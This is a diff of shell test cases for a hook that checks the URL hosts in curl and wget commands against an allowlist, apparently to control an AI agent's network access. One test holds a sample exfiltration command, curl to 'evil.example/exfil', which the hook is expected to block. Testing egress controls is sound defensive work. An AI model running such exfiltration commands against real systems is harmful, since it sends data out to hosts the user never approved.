@@ -123,6 +123,33 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
+@test "AC-2 (Copilot R5): curl with double-quoted URL → quote stripped + allowed" {
+  # CI scripts commonly quote URLs (`curl "$URL"`, `curl "https://..."`).
+  # Without quote-stripping, the token was `"https://api.github.com/..."`
+  # (literal quotes), the regex didn't match, and the hook fail-CLOSED
+  # with "no extractable URL host" on legitimate use.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl "https://api.github.com/repos/foo/bar"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Copilot R5): curl with single-quoted URL → quote stripped + allowed" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash "curl 'https://api.github.com/repos/foo/bar'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Copilot R5): quoted URL pointing at non-allowlisted host still blocks" {
+  # Verify the strip doesn't accidentally allow more — block path stays
+  # active for non-allowlisted hosts even when quoted.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl "https://evil.example/exfil"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
 @test "AC-2: wget http://pypi.org → host extracted + checked" {
   echo 'pypi.org' > "$ALLOWLIST"
   run _call_hook_bash 'wget http://pypi.org/simple/foo'
